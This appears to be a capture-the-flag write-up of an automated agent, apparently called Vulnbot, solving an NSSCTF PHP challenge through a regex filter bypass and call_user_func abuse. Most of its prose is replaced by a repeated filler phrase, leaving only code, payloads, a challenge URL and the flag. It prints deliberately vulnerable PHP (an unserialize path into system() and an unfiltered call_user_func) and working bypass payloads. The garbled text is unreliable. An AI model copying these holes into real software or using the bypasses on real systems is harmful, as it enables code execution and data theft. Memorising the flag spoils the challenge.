# 🦞 War Story #001 — NSSCTF PHP case study note + call_user_func

## case study note

| case study note | case study note |
|------|------|
| **case study note** | 2026-04-19 |
| **case study note** | `http://node5.anna.nssctf.cn:23284/` |
| **case study note** | Web — PHP case study note + call_user_func case study note |
| **case study note** | PHP、case study note、case study note、call_user_func、case study note |
| **Vulnbot case study note** | 12 |
| **MCP case study note** | fetch |
| **case study note Flag** | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` |

---

## case study note（case study note）

| case study note | case study note | case study note |
|------|------|------|
| 1 | GET case study note | Apache/2.4.54 + PHP/7.4.30，case study note `js/1.js` case study note `css/1.css` |
| 2 | case study note `js/1.js` | JS case study note Base64 case study note `NSSCTF{TnNTY1RmLnBocA==}` |
| 3 | Base64 case study note | case study note `NsScTf.php` — case study note PHP case study note |
| 4 | GET case study note `NsScTf.php` | case study note：NSSCTF case study note + `call_user_func` case study note |
| 5 | case study note | `preg_match("/n|c/m", ...)` case study note `i` case study note → case study note |
| 6 | case study note `p=Nss::ctf`（case study note） | case study note "no" — Nss case study note，case study note |
| 7 | case study note `hint2.php` | case study note：**"case study note，case study notenss2"** |
| 8 | case study note `p=Nss2::Ctf` | case study note "no" — `Nss2` case study note `s` case study note，case study note `::` case study note |
| 9 | case study note `call_user_func` case study note | `call_user_func` case study note `['case study note', 'case study note']` |
| 10 | case study note payload | `p[]=nss2&p[]=ctf` → case study note `preg_match`，case study note `nss2::ctf()` |
| 11 | case study note `GET /NsScTf.php p[]=nss2&p[]=ctf` | ✅ case study note！case study note `< php $flag="NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}"; >` |
| 12 | Flag case study note | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` ✅ |

---

## case study note

### case study note

```php
< php
header('Content-type: text/html; charset=utf-8');
error_reporting(0);
highlight_file(__FILE__);

class NSSCTF{
    public $cmd;
    public $name;

    function __destruct(){
        if(strlen($this->cmd) > 1 && strlen($this->cmd) < 100){
            if(stripos($this->cmd, 'n') !== false || stripos($this->cmd, 'c') !== false){
                if (preg_match_all('/n|c/', $this->cmd, $matches)){
                    system($this->cmd);
                }
            }
        }
    }
}

@unserialize($_GET['nss']);
 >
```

**case study note**: `NSSCTF` case study note `stripos` case study note + `preg_match_all` case study note RCE case study note。**case study note**。

### case study note（NsScTf.php case study note）

```php
//hint: case study notegetcase study note
include("flag.php");
class nss {
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m", $_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

### hint2.php

```
case study note，case study notenss2
```

### case study note flag case study note

```php
class nss2 {
    static function ctf(){
        include("flag.php");
        echo $flag;
    }
}
```

---

## case study note Payload case study note

### Payload 1: case study note（case study note）

```
GET /NsScTf.php p[]=nss2&p[]=ctf
```

**case study note**:
1. ` p[]=nss2&p[]=ctf` case study note `$_GET['p']` case study note `['nss2', 'ctf']`
2. `preg_match("/n|c/m", array, ...)` case study note，case study note `false` → **case study note**
3. `call_user_func(['nss2', 'ctf'])` — case study note `nss2::ctf()` → case study note `flag.php` case study note

### Payload 2: case study note（case study note）

```
GET /NsScTf.php p=Nss2::Ctf
```

**case study note**:
- case study note `/n|c/m` case study note `i` case study note，case study note `n` case study note `c`
- `Nss2::Ctf` case study note `N` case study note `C` case study note，case study note → case study note
- PHP case study note，`Nss2::Ctf` case study note `nss2::ctf()`

> ⚠️ case study note（Round 7 case study note "no"），case study note PHP case study note `call_user_func` case study note `Nss2::Ctf` case study note，case study note。**case study note**。

---

## Vulnbot case study note

case study note（#001 case study note），Vulnbot case study note：

| case study note | case study note | case study note | case study note |
|----------|------|------|------|
| case study note | fetch case study note flag | LLM case study note think case study note | prompts.py case study note |
| case study note | `call_user_func('readfile')` case study note | case study note call_user_func case study note | case study note |
| case study note | case study note flag case study note [DONE] | case study note | core.py case study note flag case study note |
| case study note | case study note | case study note PHP case study note | prompts.py + Skill case study note |

**case study note**:
- `prompts.py` case study note"case study note"case study note + Flag case study note + PHP case study note
- `core.py` case study note `_detect_flag_claim()` flag case study note + case study note
- `web-playbook-24-php-regex-bypass.md` case study note PHP case study note

---

## case study note

### case study note

1. **case study note**: case study note `i`（case study note）、`m`（case study note）、`s`（case study note）case study note
2. **case study note**: case study note `i` case study note，PHP case study note/case study note
3. **case study note**: `preg_match` case study note `false`，case study note `preg_match` case study note
4. **call_user_func case study note**: `['case study note', 'case study note']` case study note `case study note::case study note()`
5. **case study note**: case study note `stripos` case study note → case study note `call_user_func` case study note → case study note

### Vulnbot case study note

| case study note | case study note | case study note |
|------|------|------|
| case study note | case study note JS case study note Base64 case study note | ⭐⭐⭐⭐ |
| case study note | case study note call_user_func case study note | ⭐⭐⭐⭐ |
| case study note | case study note → case study note，case study note | ⭐⭐⭐ |
| Flag case study note | case study note，case study note flag case study note | ⭐⭐⭐⭐ |
| case study note | case study note，case study note | ⭐⭐⭐⭐ |

---

*Vulnbot case study note · 2026-04-19 · 12 case study note · case study note · case study note 🦞*
